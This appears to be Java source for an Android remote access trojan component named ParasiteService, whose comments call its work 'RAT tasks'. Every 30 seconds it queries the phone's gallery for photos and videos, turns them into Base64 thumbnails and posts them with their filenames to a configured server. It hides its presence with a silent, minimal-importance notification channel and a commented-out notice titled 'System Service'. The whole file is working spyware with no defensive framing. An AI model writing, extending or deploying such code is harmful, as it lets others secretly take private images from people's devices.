package com.app.minirat;

import com.app.minirat.BuildConfig;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ParasiteService extends Service {
    private static final String TAG = "ParasiteService";
    private static final String CHANNEL_ID = "ParasiteChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String SERVER_URL = BuildConfig.DOMAIN_URL;

    private Handler handler = new Handler();
    private Runnable periodicTask;
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
//        startForeground(NOTIFICATION_ID, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Parasite service started");
        startParasiteMonitoring();
        return START_STICKY;
    }

    private void startParasiteMonitoring() {
        periodicTask = new Runnable() {
            @Override
            public void run() {
                try {
                    // Perform RAT tasks
                    performRATTasks();

                    // Schedule next check (30 seconds)
                    handler.postDelayed(this, 30000);
                } catch (Exception e) {
                    Log.e(TAG, "Error in parasite monitoring", e);
                    handler.postDelayed(this, 30000);
                }
            }
        };

        handler.post(periodicTask);
    }

    private void performRATTasks() {
        Log.d(TAG, "Performing RAT tasks...");

        // Upload gallery thumbnails
        uploadGalleryThumbnails();
    }

    private void uploadGalleryThumbnails() {
        executor.execute(() -> {
            try {
                // Get all gallery images and videos
                ArrayList<String> galleryFiles = getGalleryFiles();

                for (String filePath : galleryFiles) {
                    try {
                        // Create thumbnail instead of full file
                        String thumbnailBase64 = createThumbnail(filePath);

                        // Send thumbnail to server
                        String fileName = new File(filePath).getName();
                        sendThumbnailToServer(fileName, thumbnailBase64);

                        Log.d(TAG, "Uploaded thumbnail for: " + fileName);

                    } catch (Exception e) {
                        Log.e(TAG, "Error processing file: " + filePath, e);
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Error getting gallery files", e);
            }
        });
    }

    private ArrayList<String> getGalleryFiles() {
        ArrayList<String> files = new ArrayList<>();
        try {
            // Query for images and videos
            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.MIME_TYPE
            };

            String selection = MediaStore.Images.Media.MIME_TYPE + "=? OR " +
                    MediaStore.Images.Media.MIME_TYPE + "=?";

            String[] selectionArgs = {
                    "image/jpeg",
                    "video/mp4"
            };

            Cursor cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String filePath = cursor.getString(cursor.getColumnIndexOrThrow(
                            MediaStore.Images.Media.DATA));
                    files.add(filePath);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting gallery files", e);
        }
        return files;
    }

    private String createThumbnail(String filePath) throws IOException {
        // Create a small thumbnail (128x128) instead of full file
        Bitmap bitmap = BitmapFactory.decodeFile(filePath);

        if (bitmap == null) {
            // If we can't decode, return a placeholder
            return createPlaceholderThumbnail();
        }

        // Scale down to thumbnail size (128x128)
        int thumbnailWidth = 128;
        int thumbnailHeight = 128;

        // Calculate scaling factor to maintain aspect ratio
        float scaleWidth = ((float) thumbnailWidth) / bitmap.getWidth();
        float scaleHeight = ((float) thumbnailHeight) / bitmap.getHeight();
        float scale = Math.min(scaleWidth, scaleHeight);

        Matrix matrix = new Matrix();
        matrix.postScale(scale, scale);

        // Create thumbnail
        Bitmap thumbnail = Bitmap.createBitmap(bitmap, 0, 0,
                bitmap.getWidth(), bitmap.getHeight(), matrix, true);

        // Convert to Base64
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        thumbnail.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] thumbnailBytes = baos.toByteArray();
        baos.close();

        return Base64.encodeToString(thumbnailBytes, Base64.NO_WRAP);
    }

    private String createPlaceholderThumbnail() {
        // Create a simple placeholder image
        Bitmap placeholder = Bitmap.createBitmap(128, 128, Bitmap.Config.RGB_565);
        placeholder.eraseColor(0xFFCCCCCC); // Light gray

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        placeholder.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] placeholderBytes = baos.toByteArray();
        try {
            baos.close();
        } catch (IOException e) {
            Log.e(TAG, "Error closing ByteArrayOutputStream", e);
        }

        return Base64.encodeToString(placeholderBytes, Base64.NO_WRAP);
    }

    private void sendThumbnailToServer(String fileName, String thumbnailBase64) {
        try {
            URL url = new URL(SERVER_URL + "/upload/thumbnail");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);

            // Create JSON payload with thumbnail data
            String jsonPayload = "{\"filename\":\"" + fileName +
                    "\",\"thumbnail\":\"" + thumbnailBase64 + "\"}";

            byte[] postData = jsonPayload.getBytes("UTF-8");
            connection.setFixedLengthStreamingMode(postData.length);

            DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
            dos.write(postData);
            dos.flush();
            dos.close();

            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Thumbnail upload response: " + responseCode);

            connection.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "Error sending thumbnail to server", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Parasite Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setSound(null, null);
            channel.setVibrationPattern(new long[]{0});
            channel.setImportance(NotificationManager.IMPORTANCE_MIN);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_notification)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setAutoCancel(false)
                .setOngoing(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Parasite service destroyed");
        handler.removeCallbacks(periodicTask);
        super.onDestroy();
    }
}
